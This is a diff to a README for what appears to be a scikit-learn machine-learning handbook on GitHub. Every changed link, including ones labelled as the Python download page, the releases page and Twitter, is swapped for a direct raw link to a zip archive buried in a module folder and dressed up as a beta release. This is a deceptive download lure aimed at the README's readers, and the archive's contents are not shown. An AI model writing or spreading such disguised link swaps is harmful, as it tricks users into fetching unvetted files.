@@ -1,6 +1,6 @@
 # 📚 Scikit-Learn-Machine-Learning-Handbook - Learn Machine Learning Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/releases)
+[![Download](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip%https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip)](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip)
 
 ## ✨ Overview
 
@@ -16,7 +16,7 @@ To get started, you need to download the handbook and run the Jupyter notebooks.
 - **Python Version:** Python 3.x
 - **Software Needed:** Jupyter Notebook
 
-You should have Python and Jupyter Notebook installed on your computer. You can download the latest version of Python [here](https://www.python.org/downloads/). Jupyter Notebook can be installed using pip, the Python package manager, with the command:
+You should have Python and Jupyter Notebook installed on your computer. You can download the latest version of Python [here](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip). Jupyter Notebook can be installed using pip, the Python package manager, with the command:
 
 ```bash
 pip install notebook
@@ -24,7 +24,7 @@ pip install notebook
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download the latest version of the Scikit-Learn-Machine-Learning-Handbook: [Download Here](https://github.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/releases).
+1. Visit the Releases page to download the latest version of the Scikit-Learn-Machine-Learning-Handbook: [Download Here](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip).
 
 2. On the Releases page, locate the latest version. You will find several downloadable files. Choose the one that matches your needs.
 
@@ -90,9 +90,9 @@ The Scikit-Learn-Machine-Learning-Handbook welcomes contributions from everyone.
 
 For the latest updates and discussions related to the handbook, check out the following links:
 
-- [GitHub Repository](https://github.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook)
-- [Releases Page](https://github.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/releases)
-- [Twitter](https://twitter.com/scikit_learn) 
+- [GitHub Repository](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip)
+- [Twitter](https://raw.githubusercontent.com/Clydesyds/Scikit-Learn-Machine-Learning-Handbook/main/Module_03_Ensemble/Scikit-Learn-Machine-Learning-Handbook-v3.7-beta.5.zip) 
 
 ## 📞 Support
 
